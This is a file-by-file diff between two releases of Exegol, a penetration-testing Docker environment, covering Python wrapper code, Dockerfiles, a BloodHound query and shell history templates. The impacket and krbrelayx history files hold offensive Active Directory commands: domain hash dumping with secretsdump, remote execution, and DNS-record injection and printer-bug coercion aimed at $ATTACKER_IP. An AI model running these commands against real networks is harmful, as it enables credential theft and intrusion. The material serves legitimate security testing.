+        return cls.default_x11_path
 
     @classmethod
     def getDisplayEnv(cls) -> str:
         """
         Get the current DISPLAY env to access X11 socket
         :return:
         """
         if EnvInfo.isMacHost():
             # xquartz Mac mode
             return "host.docker.internal:0"
+
+        # Add ENV check is case of user don't have it, which will mess up GUI if fallback does not work
+        # @see https://github.com/ThePorgs/Exegol/issues/148
+        if os.getenv("DISPLAY") is None:
+            logger.warning("The DISPLAY environment variable is not set on your host. This can prevent GUI apps to start")
+
         # DISPLAY var is fetch from the current user environment. If it doesn't exist, using ':0'.
         return os.getenv('DISPLAY', ":0")
 
     # # # # # # Mac specific methods # # # # # #
 
     @classmethod
     def __macGuiChecks(cls) -> bool:
@@ -86,19 +96,20 @@
 
         # Check if XQuartz is started, check is dir exist and if there is at least one socket
         if not cls.__isXQuartzRunning():
             if not cls.__startXQuartz():
                 logger.warning("Unable to start XQuartz service.")
                 return False
 
+        # The /tmp config is not necessary until you can use the unix socket with docker-desktop volume
         # Check if Docker Desktop is configured with /tmp in Docker Desktop > Preferences > Resources > File Sharing
-        if not cls.__checkDockerDesktopResourcesConfig():
-            logger.warning("Display sharing not possible, Docker Desktop configuration is incorrect. Please add /tmp in "
-                           "[magenta]Docker Desktop > Preferences > Resources > File Sharing[/magenta]")
-            return False
+        #if EnvInfo.isDockerDesktop() and not cls.__checkDockerDesktopResourcesConfig():
+        #    logger.warning("Display sharing not possible, Docker Desktop configuration is incorrect. Please add /tmp in "
+        #                   "[magenta]Docker Desktop > Preferences > Resources > File Sharing[/magenta]")
+        #    return False
         return True
 
     @staticmethod
     def __checkDockerDesktopResourcesConfig() -> bool:
         """
             Check if Docker Desktop for macOS is configured correctly, allowing
             /tmp to be bind mounted into Docker containers, which is needed to
@@ -123,15 +134,15 @@
         return conf_check.stdout.strip() == b'0'
 
     @classmethod
     def __isXQuartzRunning(cls) -> bool:
         """
         Check if xquartz service is up by testing sockets
         """
-        socket_path = Path(cls.getX11SocketPath())
+        socket_path = Path(cls.default_x11_path)
         socket_x11_found = False
         if socket_path.is_dir():
             for file in socket_path.glob("*"):
                 if file.is_socket():
                     socket_x11_found = True
                     break
         return socket_x11_found
```

### Comparing `Exegol-4.1.1/exegol/utils/MetaSingleton.py` & `Exegol-4.2.0/exegol/utils/MetaSingleton.py`

 * *Files identical despite different names*

### Comparing `Exegol-4.1.1/exegol/utils/WebUtils.py` & `Exegol-4.2.0/exegol/utils/WebUtils.py`

 * *Files 0% similar despite different names*

```diff
@@ -4,15 +4,15 @@
 from typing import Any, Optional, Dict
 
 import requests
 from requests import Response
 
 from exegol.console.cli.ParametersManager import ParametersManager
 from exegol.exceptions.ExegolExceptions import CancelOperation
-from exegol.utils.ConstantConfig import ConstantConfig
+from exegol.config.ConstantConfig import ConstantConfig
 from exegol.utils.ExeLog import logger
 
 
 class WebUtils:
     __registry_token: Optional[str] = None
 
     @classmethod
```

### Comparing `Exegol-4.1.1/exegol/utils/argParse.py` & `Exegol-4.2.0/exegol/utils/argParse.py`

 * *Files 13% similar despite different names*

```diff
@@ -1,8 +1,9 @@
 import argparse
+import argcomplete
 from logging import CRITICAL
 from typing import IO, Optional, List, Union, Dict, cast
 
 from exegol.console.cli.actions.Command import Command, Option
 from exegol.utils.ExeLog import logger
 
 
@@ -16,15 +17,15 @@
 
 
 class Parser:
     """Custom Exegol CLI Parser. Main controller of argument building and parsing."""
 
     __description = "This Python script is a wrapper for Exegol. It can be used to easily manage Exegol on " \
                     "your machine."
-    __formatter_class: type = argparse.RawTextHelpFormatter
+    __formatter_class = argparse.RawTextHelpFormatter
 
     def __init__(self, actions: List[Command]):
         """Custom parser creation"""
         # Defines every actions available
         self.__actions: List[Command] = actions
         # Create & init root parser
         self.__root_parser: ExegolArgParse
@@ -77,23 +78,28 @@
                 else:
                     # In every other case, a dedicated group is created in the parser
                     group_parser = sub_parser.add_argument_group(argument_group.title,
                                                                  description=argument_group.description)
                 # once the group is created in the parser, the arguments can be added to it
                 option: Dict[str, Union[Option, bool]]
                 for option in argument_group.options:
+                    # Retrieve Option object from the Dict
+                    assert type(option["arg"]) is Option
+                    argument = cast(Option, option["arg"])
+                    # Pop is required here to removed unknown parameter from the action object before argparse
+                    completer = argument.kwargs.pop("completer", None)
                     try:
-                        # Retrieve Option object from the Dict
-                        assert type(option["arg"]) is Option
-                        argument = cast(Option, option["arg"])
-                        # Add argument with its config to the parser
-                        group_parser.add_argument(*argument.args, **argument.kwargs)
+                        arg = group_parser.add_argument(*argument.args, **argument.kwargs)
                     except argparse.ArgumentError:
                         continue
+                    # Add argument with its config to the parser
+                    if completer is not None:
+                        arg.completer = completer  # type: ignore
 
     def run_parser(self) -> argparse.Namespace:
         """Execute argparse to retrieve user options from argv"""
+        argcomplete.autocomplete(self.__root_parser)
         return self.__root_parser.parse_args()
 
     def print_help(self):
         """Force argparse to display the help message"""
         self.__root_parser.print_help()
```

### Comparing `Exegol-4.1.1/exegol-docker-build/Dockerfile` & `Exegol-4.2.0/exegol-docker-build/Dockerfile`

 * *Files 2% similar despite different names*

```diff
@@ -6,15 +6,15 @@
 ARG VERSION="local"
 ARG BUILD_DATE="n/a"
 
 LABEL org.exegol.tag="${TAG}"
 LABEL org.exegol.version="${VERSION}"
 LABEL org.exegol.build_date="${BUILD_DATE}"
 LABEL org.exegol.app="Exegol"
-LABEL org.exegol.src_repository="https://github.com/ShutdownRepo/Exegol-images"
+LABEL org.exegol.src_repository="https://github.com/ThePorgs/Exegol-images"
 
 RUN echo "${TAG}-${VERSION}" > /opt/.exegol_version
 
 ADD sources /root/sources
 RUN chmod +x /root/sources/install.sh
 
 RUN /root/sources/install.sh package_base
```

### Comparing `Exegol-4.1.1/exegol-docker-build/ad.dockerfile` & `Exegol-4.2.0/exegol-docker-build/ad.dockerfile`

 * *Files 2% similar despite different names*

```diff
@@ -6,15 +6,15 @@
 ARG VERSION="local"
 ARG BUILD_DATE="n/a"
 
 LABEL org.exegol.tag="${TAG}"
 LABEL org.exegol.version="${VERSION}"
 LABEL org.exegol.build_date="${BUILD_DATE}"
 LABEL org.exegol.app="Exegol"
-LABEL org.exegol.src_repository="https://github.com/ShutdownRepo/Exegol-images"
+LABEL org.exegol.src_repository="https://github.com/ThePorgs/Exegol-images"
 
 RUN echo "${TAG}-${VERSION}" > /opt/.exegol_version
 
 ADD sources /root/sources
 RUN chmod +x /root/sources/install.sh
 
 RUN /root/sources/install.sh package_base
```

### Comparing `Exegol-4.1.1/exegol-docker-build/debug.dockerfile` & `Exegol-4.2.0/exegol-docker-build/debug.dockerfile`

 * *Files 9% similar despite different names*

```diff
@@ -1,42 +1,44 @@
 # Author: The Exegol Project
-
+#
 FROM debian
 
 ARG TAG="local"
 ARG VERSION="local"
 ARG BUILD_DATE="n/a"
 
 LABEL org.exegol.tag="${TAG}"
 LABEL org.exegol.version="${VERSION}"
 LABEL org.exegol.build_date="${BUILD_DATE}"
 LABEL org.exegol.app="Exegol"
-LABEL org.exegol.src_repository="https://github.com/ShutdownRepo/Exegol-images"
+LABEL org.exegol.src_repository="https://github.com/ThePorgs/Exegol-images"
 
 RUN echo "${TAG}-${VERSION}" > /opt/.exegol_version
 
 ADD sources /root/sources
 RUN chmod +x /root/sources/install.sh
 
 RUN /root/sources/install.sh deploy_exegol
 RUN /root/sources/install.sh update
 RUN apt-get update && apt-get install -y sudo git curl zsh asciinema zip wget ncat dnsutils python2 python3 python3-setuptools python3-pip vim nano procps automake autoconf make
 RUN ln -s /usr/bin/python2.7 /usr/bin/python
 RUN /root/sources/install.sh filesystem
-RUN /root/sources/install.sh set_go_env
-RUN /root/sources/install.sh install_locales
-RUN /root/sources/install.sh install_rust_cargo
-RUN /root/sources/install.sh install_tmux
+#RUN /root/sources/install.sh set_go_env
+#RUN /root/sources/install.sh install_locales
+#RUN /root/sources/install.sh install_rust_cargo
+#RUN /root/sources/install.sh install_tmux
 RUN /root/sources/install.sh install_ohmyzsh
 RUN /root/sources/install.sh install_fzf
 RUN /root/sources/install.sh install_openvpn
 RUN /root/sources/install.sh install_pipx
 RUN /root/sources/install.sh install_python3
-RUN /root/sources/install.sh install_python-pip
-RUN /root/sources/install.sh install_exegol-history
-#RUN /root/sources/install.sh add-test-command "fail_command"
+#RUN /root/sources/install.sh install_python-pip
+#RUN /root/sources/install.sh install_exegol-history
+#RUN /root/sources/install.sh install_kerbrute
+RUN /root/sources/install.sh add-test-command "whoami --version"
+RUN /root/sources/install.sh add-test-command "fail_command"
 
 RUN /root/sources/install.sh post_install_clean
 
 WORKDIR /workspace
 
-ENTRYPOINT ["/.exegol/entrypoint.sh"]
+ENTRYPOINT ["/.exegol/entrypoint.sh"]
```

### Comparing `Exegol-4.1.1/exegol-docker-build/light.dockerfile` & `Exegol-4.2.0/exegol-docker-build/light.dockerfile`

 * *Files 2% similar despite different names*

```diff
@@ -6,15 +6,15 @@
 ARG VERSION="local"
 ARG BUILD_DATE="n/a"
 
 LABEL org.exegol.tag="${TAG}"
 LABEL org.exegol.version="${VERSION}"
 LABEL org.exegol.build_date="${BUILD_DATE}"
 LABEL org.exegol.app="Exegol"
-LABEL org.exegol.src_repository="https://github.com/ShutdownRepo/Exegol-images"
+LABEL org.exegol.src_repository="https://github.com/ThePorgs/Exegol-images"
 
 RUN echo "${TAG}-${VERSION}" > /opt/.exegol_version
 
 ADD sources /root/sources
 RUN chmod +x /root/sources/install.sh
 
 RUN /root/sources/install.sh package_base
```

### Comparing `Exegol-4.1.1/exegol-docker-build/osint.dockerfile` & `Exegol-4.2.0/exegol-docker-build/web.dockerfile`

 * *Files 2% similar despite different names*

```diff
@@ -6,45 +6,45 @@
 ARG VERSION="local"
 ARG BUILD_DATE="n/a"
 
 LABEL org.exegol.tag="${TAG}"
 LABEL org.exegol.version="${VERSION}"
 LABEL org.exegol.build_date="${BUILD_DATE}"
 LABEL org.exegol.app="Exegol"
-LABEL org.exegol.src_repository="https://github.com/ShutdownRepo/Exegol-images"
+LABEL org.exegol.src_repository="https://github.com/ThePorgs/Exegol-images"
 
 RUN echo "${TAG}-${VERSION}" > /opt/.exegol_version
 
 ADD sources /root/sources
 RUN chmod +x /root/sources/install.sh
 
 RUN /root/sources/install.sh package_base
 
 # WARNING: package_most_used can't be used with other functions other than: package_base, post_install_clean
 # RUN /root/sources/install.sh package_most_used
 
 # WARNING: the following installs (except: package_base, post_install_clean) can't be used with package_most_used
 RUN /root/sources/install.sh package_misc
-# RUN /root/sources/install.sh package_wordlists
-# RUN /root/sources/install.sh package_cracking
+RUN /root/sources/install.sh package_wordlists
+RUN /root/sources/install.sh package_cracking
 RUN /root/sources/install.sh package_osint
-# RUN /root/sources/install.sh package_web
+RUN /root/sources/install.sh package_web
 # RUN /root/sources/install.sh package_c2
 # RUN /root/sources/install.sh package_ad
 # RUN /root/sources/install.sh package_mobile
 # RUN /root/sources/install.sh package_iot
 # RUN /root/sources/install.sh package_rfid
 # RUN /root/sources/install.sh package_sdr
 # RUN /root/sources/install.sh package_network
 # RUN /root/sources/install.sh package_wifi
 # RUN /root/sources/install.sh package_forensic
 # RUN /root/sources/install.sh package_cloud
 # RUN /root/sources/install.sh package_steganography
 # RUN /root/sources/install.sh package_reverse
-# RUN /root/sources/install.sh package_code_analysis
+RUN /root/sources/install.sh package_code_analysis
 
 RUN /root/sources/install.sh post_install_clean
 
 RUN rm -rf /root/sources
 
 WORKDIR /workspace
```

### Comparing `Exegol-4.1.1/exegol-docker-build/sources/bloodhound/config.json` & `Exegol-4.2.0/exegol-docker-build/sources/bloodhound/config.json`

 * *Files identical despite different names*

### Comparing `Exegol-4.1.1/exegol-docker-build/sources/bloodhound/customqueries.json` & `Exegol-4.2.0/exegol-docker-build/sources/bloodhound/customqueries.json`

 * *Files 1% similar despite different names*

#### Pretty-printed

 * *Similarity: 0.9947916666666667%*

 * *Differences: {"'queries'": "{insert: [(31, OrderedDict([('name', 'Groups that can change user passwords'), "*

 * *              "('category', 'A one-man wolf pack'), ('queryList', [OrderedDict([('final', True), "*

 * *              "('query', 'MATCH p=(m:Group)-[r:ForceChangePassword]->(n:User) RETURN DISTINCT "*

 * *              "m[.]name,  COUNT(m[.]name) ORDER BY COUNT(m[.]name) DESC')])])]))]}"}*

```diff
@@ -314,14 +314,24 @@
                     "final": true,
                     "query": "Match (n:Group) WHERE n.name CONTAINS 'ADMIN' RETURN n"
                 }
             ]
         },
         {
             "category": "A one-man wolf pack",
+            "name": "Groups that can change user passwords",
+            "queryList": [
+                {
+                    "final": true,
+                    "query": "MATCH p=(m:Group)-[r:ForceChangePassword]->(n:User) RETURN DISTINCT m[.]name,  COUNT(m[.]name) ORDER BY COUNT(m[.]name) DESC"
+                }
+            ]
+        },
+        {
+            "category": "A one-man wolf pack",
             "name": "Groups of High Value Targets",
             "queryList": [
                 {
                     "final": true,
                     "query": "MATCH p=(n:User)-[r:MemberOf*1..]->(m:Group {highvalue:true}) RETURN p"
                 }
             ]
```

### Comparing `Exegol-4.1.1/exegol-docker-build/sources/exegol/entrypoint.sh` & `Exegol-4.2.0/exegol-docker-build/sources/exegol/entrypoint.sh`

 * *Files identical despite different names*

### Comparing `Exegol-4.1.1/exegol-docker-build/sources/exegol/load_supported_setups.sh` & `Exegol-4.2.0/exegol-docker-build/sources/exegol/load_supported_setups.sh`

 * *Files 14% similar despite different names*

```diff
@@ -102,14 +102,34 @@
     cp /.exegol/skel/load_user_setup.sh "$MY_Setup_PATH/load_user_setup.sh"
     chmod 760 "$MY_Setup_PATH/load_user_setup.sh"
   fi
 
   echo "[$(date +'%d-%m-%Y_%H-%M-%S')] ==== End of custom setups loading ===="
 }
 
+function deploy_firefox_addons() {
+  ##### firefox custom addons deployment
+  if [ -d "$MY_Setup_PATH/firefox/" ]; then
+    if [ -d "$MY_Setup_PATH/firefox/addons" ]; then
+      ADDON_FOLDER="-D $MY_Setup_PATH/firefox/addons"
+    else
+      mkdir "$MY_Setup_PATH/firefox/addons" && chmod 770 "$MY_Setup_PATH/firefox/addons"
+    fi
+    if [ -f "$MY_Setup_PATH/firefox/addons.txt" ]; then
+      ADDON_LIST="-L $MY_Setup_PATH/firefox/addons.txt"
+    else
+      cp --preserve=mode /.exegol/skel/firefox/addons.txt "$MY_Setup_PATH/firefox/addons.txt"
+    fi
+    python3 /opt/tools/firefox/user-setup.py $ADDON_LIST $ADDON_FOLDER
+  else
+    mkdir --parents "$MY_Setup_PATH/firefox/addons" && chmod 770 -R "$MY_Setup_PATH/firefox/addons"
+    cp --preserve=mode /.exegol/skel/firefox/addons.txt "$MY_Setup_PATH/firefox/addons.txt"
+  fi
+}
+
 # Starting
 # This procedure is supposed to be executed only once at the first startup, using a lockfile check
 
 echo "This log file is the result of the execution of the official and personal customization script"
 echo "[$(date +'%d-%m-%Y_%H-%M-%S')] ==== Loading custom setups (/.exegol/load_supported_setups.sh) ===="
 
 # Root my-resources PATH
@@ -120,11 +140,12 @@
 init
 
 deploy_zsh
 deploy_tmux
 deploy_vim
 deploy_apt
 deploy_python3
+deploy_firefox_addons
 
 run_user_setup
 
-exit 0
+exit 0
```

### Comparing `Exegol-4.1.1/exegol-docker-build/sources/exegol/skel/README.md` & `Exegol-4.2.0/exegol-docker-build/sources/exegol/skel/README.md`

 * *Files identical despite different names*

### Comparing `Exegol-4.1.1/exegol-docker-build/sources/exegol/skel/load_user_setup.sh` & `Exegol-4.2.0/exegol-docker-build/sources/exegol/skel/load_user_setup.sh`

 * *Files identical despite different names*

### Comparing `Exegol-4.1.1/exegol-docker-build/sources/exegol/skel/supported_setups.md` & `Exegol-4.2.0/exegol-docker-build/sources/exegol/skel/supported_setups.md`

 * *Files 2% similar despite different names*

```diff
@@ -40,8 +40,8 @@
 ## Advanced customizations
 
 Alternatively, the `/opt/my-resources/setup/load_user_setup.sh` script can be used to install additional tools and configurations.
 The script is executed on the first startup of each new container with the "my-resources" feature enabled.
 Any command added in this script is executed.
 
 ## Contribution
-Feel free to contribute, implement new supported customizations, etc. and open a pull-request on [Exegol-images](https://github.com/ShutdownRepo/Exegol-images).
+Feel free to contribute, implement new supported customizations, etc. and open a pull-request on [Exegol-images](https://github.com/ThePorgs/Exegol-images).
```

### Comparing `Exegol-4.1.1/exegol-docker-build/sources/exegol/start.sh` & `Exegol-4.2.0/exegol-docker-build/sources/exegol/start.sh`

 * *Files identical despite different names*

### Comparing `Exegol-4.1.1/exegol-docker-build/sources/grc/conf.getgpppassword` & `Exegol-4.2.0/exegol-docker-build/sources/grc/conf.getgpppassword`

 * *Files identical despite different names*

### Comparing `Exegol-4.1.1/exegol-docker-build/sources/grc/conf.ntlmrelayx` & `Exegol-4.2.0/exegol-docker-build/sources/grc/conf.ntlmrelayx`

 * *Files identical despite different names*

### Comparing `Exegol-4.1.1/exegol-docker-build/sources/grc/conf.rbcd` & `Exegol-4.2.0/exegol-docker-build/sources/grc/conf.rbcd`

 * *Files identical despite different names*

### Comparing `Exegol-4.1.1/exegol-docker-build/sources/grc/conf.secretsdump` & `Exegol-4.2.0/exegol-docker-build/sources/grc/conf.secretsdump`

 * *Files identical despite different names*

### Comparing `Exegol-4.1.1/exegol-docker-build/sources/grc/grc.conf` & `Exegol-4.2.0/exegol-docker-build/sources/grc/grc.conf`

 * *Files identical despite different names*

### Comparing `Exegol-4.1.1/exegol-docker-build/sources/patches/undefined-symbol-aesni-key.patch` & `Exegol-4.2.0/exegol-docker-build/sources/patches/undefined-symbol-aesni-key.patch`

 * *Files identical despite different names*

### Comparing `Exegol-4.1.1/exegol-docker-build/sources/proxychains/proxychains.conf` & `Exegol-4.2.0/exegol-docker-build/sources/proxychains/proxychains.conf`

 * *Files identical despite different names*

### Comparing `Exegol-4.1.1/exegol-docker-build/sources/trilium/config.ini` & `Exegol-4.2.0/exegol-docker-build/sources/trilium/config.ini`

 * *Files identical despite different names*

### Comparing `Exegol-4.1.1/exegol-docker-build/sources/trilium/document.db` & `Exegol-4.2.0/exegol-docker-build/sources/trilium/document.db`

 * *Files identical despite different names*

### Comparing `Exegol-4.1.1/exegol-docker-build/sources/trilium/document.db-shm` & `Exegol-4.2.0/exegol-docker-build/sources/trilium/document.db-shm`

 * *Files identical despite different names*

### Comparing `Exegol-4.1.1/exegol-docker-build/sources/trilium/document.db-wal` & `Exegol-4.2.0/exegol-docker-build/sources/trilium/document.db-wal`

 * *Files identical despite different names*

### Comparing `Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases` & `Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases`

 * *Files 9% similar despite different names*

```diff
@@ -6,11 +6,12 @@
   [ -d /opt/my-resources/setup/zsh ] || mkdir -p /opt/my-resources/setup/zsh
   cp /.exegol/skel/zsh/aliases /opt/my-resources/setup/zsh/aliases
 fi
 
 alias rickroll='curl tiredand.gay/rick'
 alias l='ls -alh'
 alias ipa='ip --brief --color a'
+alias ipr='ip --brief --color r'
 alias urlencode='python -c "import sys, urllib as ul; print ul.quote_plus(sys.argv[1])"'
 alias urldecode='python -c "import sys, urllib as ul; print ul.unquote_plus(sys.argv[1])"'
 alias sed-empty-line='sed /^$/d'
-alias http-put-server='python3 /opt/resources/linux/http-put-server.py --bind 0.0.0.0'
+alias http-put-server='python3 /opt/resources/linux/http-put-server.py --bind 0.0.0.0'
```

### Comparing `Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/proxmark3` & `Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/proxmark3`

 * *Files identical despite different names*

### Comparing `Exegol-4.1.1/exegol-docker-build/sources/zsh/aliases.d/responder` & `Exegol-4.2.0/exegol-docker-build/sources/zsh/aliases.d/responder`

 * *Files identical despite different names*

### Comparing `Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/crackmapexec` & `Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/crackmapexec`

 * *Files identical despite different names*

### Comparing `Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/hashcat` & `Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/hashcat`

 * *Files identical despite different names*

### Comparing `Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/impacket` & `Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/impacket`

 * *Files 1% similar despite different names*

```diff
@@ -41,15 +41,15 @@
 secretsdump -ldapfilter '(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2))' -just-dc -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST"
 secretsdump -ldapfilter '(&(objectClass=user)(adminCount=1))' -just-dc -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 "$DOMAIN"/Administrator@"$DC_HOST"
 secretsdump -no-pass "$DOMAIN"/'DC01$'@"$DC_HOST"
 secretsdump -outputfile "$DOMAIN" -just-dc -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST"
 rpcdump.py "$DC_HOST" | grep -A 6 MS-RPRN
 rbcd.py -delegate-from "$USER" -delegate-to 'sv01$' -dc-ip "$DC_IP" -action remove "$DOMAIN"/"$USER":"$PASSWORD"
 rbcd.py -delegate-from "$USER" -delegate-to 'sv01$' -dc-ip "$DC_IP" -action write "$DOMAIN"/"$USER":"$PASSWORD"
-rbcd.py t-delegate-to 'sv01$' -dc-ip "$DC_IP" -action read "$DOMAIN"/"$USER":"$PASSWORD"
+rbcd.py -delegate-to 'sv01$' -dc-ip "$DC_IP" -action read "$DOMAIN"/"$USER":"$PASSWORD"
 proxychains psexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
 proxychains secretsdump -no-pass "$DOMAIN"/"$USER"@"$TARGET"
 proxychains smbexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
 proxychains wmiexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
 psexec.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
 proxychains atexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
 proxychains dcomexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
```

### Comparing `Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/kiterunner` & `Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/kiterunner`

 * *Files identical despite different names*

### Comparing `Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/krbrelayx` & `Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/krbrelayx`

 * *Files 6% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" --record '*' --action query "$DC_HOST"
 dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" --record '*' --action add --data "$ATTACKER_IP" "$DC_HOST"
 addspn.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" -t SV01 -s "HTTP/EXEGOL-01.$DOMAIN" --additional "$DC_HOST"
 addspn.py -u "$DOMAIN"\\'SV01$' -p "ffffffffffffffffffffffffffffffff":"$NT_HASH" -s "HOST/EXEGOL-01.$DOMAIN" --additional "$DC_HOST"
 krbrelayx.py --krbpass "$PASSWORD" --krbsalt DOMAIN.LOCALSV01 -t ldap://"$DC_HOST" --escalate-user "$USER"
 krbrelayx.py -aesKey "9ff86898afa70f5f7b9f2bf16320cb38edb2639409e1bc441ac417fac1fed5ab"
-dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" -r "EXEGOL-01.$DOMAIN" -d "$ATTACKER_IP" --action add "$DC_HOST"
-dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" -r "EXEGOL-01.$DOMAIN" -d 192.168.56.1 --action query "$DC_HOST"
-dnstool.py -u "$DOMAIN"\\'SV01$' -p "ffffffffffffffffffffffffffffffff":"$NT_HASH" -r "EXEGOL-01.$DOMAIN" -d "$ATTACKER_IP" --action add "$DC_HOST"
+dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" --action add -r "EXEGOL-01.$DOMAIN" -d "$ATTACKER_IP" "$DC_HOST"
+dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" --action query -r "EXEGOL-01.$DOMAIN" "$DC_HOST"
+dnstool.py -u "$DOMAIN"\\"$USER" -p -p "ffffffffffffffffffffffffffffffff":"$NT_HASH" --action query -r "EXEGOL-01.$DOMAIN" "$DC_HOST"
 printerbug.py "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST" "$ATTACKER_IP"
```

### Comparing `Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/nmap` & `Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/nmap`

 * *Files identical despite different names*

### Comparing `Exegol-4.1.1/exegol-docker-build/sources/zsh/history.d/wfuzz` & `Exegol-4.2.0/exegol-docker-build/sources/zsh/history.d/wfuzz`

 * *Files identical despite different names*

### Comparing `Exegol-4.1.1/exegol-docker-build/sources/zsh/zshrc` & `Exegol-4.2.0/exegol-docker-build/sources/zsh/zshrc`

 * *Files identical despite different names*

### Comparing `Exegol-4.1.1/exegol-docker-build/web.dockerfile` & `Exegol-4.2.0/exegol-docker-build/osint.dockerfile`

 * *Files 4% similar despite different names*

```diff
@@ -6,45 +6,45 @@
 ARG VERSION="local"
 ARG BUILD_DATE="n/a"
 
 LABEL org.exegol.tag="${TAG}"
 LABEL org.exegol.version="${VERSION}"
 LABEL org.exegol.build_date="${BUILD_DATE}"
 LABEL org.exegol.app="Exegol"
-LABEL org.exegol.src_repository="https://github.com/ShutdownRepo/Exegol-images"
+LABEL org.exegol.src_repository="https://github.com/ThePorgs/Exegol-images"
 
 RUN echo "${TAG}-${VERSION}" > /opt/.exegol_version
 
 ADD sources /root/sources
 RUN chmod +x /root/sources/install.sh
 
 RUN /root/sources/install.sh package_base
 
 # WARNING: package_most_used can't be used with other functions other than: package_base, post_install_clean
 # RUN /root/sources/install.sh package_most_used
 
 # WARNING: the following installs (except: package_base, post_install_clean) can't be used with package_most_used
 RUN /root/sources/install.sh package_misc
-RUN /root/sources/install.sh package_wordlists
-RUN /root/sources/install.sh package_cracking
+# RUN /root/sources/install.sh package_wordlists
+# RUN /root/sources/install.sh package_cracking
 RUN /root/sources/install.sh package_osint
-RUN /root/sources/install.sh package_web
+# RUN /root/sources/install.sh package_web
 # RUN /root/sources/install.sh package_c2
 # RUN /root/sources/install.sh package_ad
 # RUN /root/sources/install.sh package_mobile
 # RUN /root/sources/install.sh package_iot
 # RUN /root/sources/install.sh package_rfid
 # RUN /root/sources/install.sh package_sdr
 # RUN /root/sources/install.sh package_network
 # RUN /root/sources/install.sh package_wifi
 # RUN /root/sources/install.sh package_forensic
 # RUN /root/sources/install.sh package_cloud
 # RUN /root/sources/install.sh package_steganography
 # RUN /root/sources/install.sh package_reverse
-RUN /root/sources/install.sh package_code_analysis
+# RUN /root/sources/install.sh package_code_analysis
 
 RUN /root/sources/install.sh post_install_clean
 
 RUN rm -rf /root/sources
 
 WORKDIR /workspace
```

### Comparing `Exegol-4.1.1/setup.py` & `Exegol-4.2.0/setup.py`

 * *Files 4% similar despite different names*

```diff
@@ -40,23 +40,25 @@
     keywords='pentest redteam ctf exegol',
     classifiers=[
         'Development Status :: 5 - Production/Stable',
         "Programming Language :: Python :: 3.7",
         "Programming Language :: Python :: 3.8",
         "Programming Language :: Python :: 3.9",
         "Programming Language :: Python :: 3.10",
+        "Programming Language :: Python :: 3.11",
         "License :: OSI Approved :: GNU General Public License v3 (GPLv3)",
         "Operating System :: OS Independent",
     ],
     install_requires=[
         'docker~=6.0.0',
         'requests',
-        'rich>=11.2.0',
+        'rich~=13.3.0',
         'PyYAML',
-        'GitPython'
+        'GitPython',
+        'argcomplete~=2.1.1'
     ],
     packages=find_packages(exclude=["tests"]),
     include_package_data=True,
     data_files=data_files,
 
     entry_points={
         'console_scripts': [
```

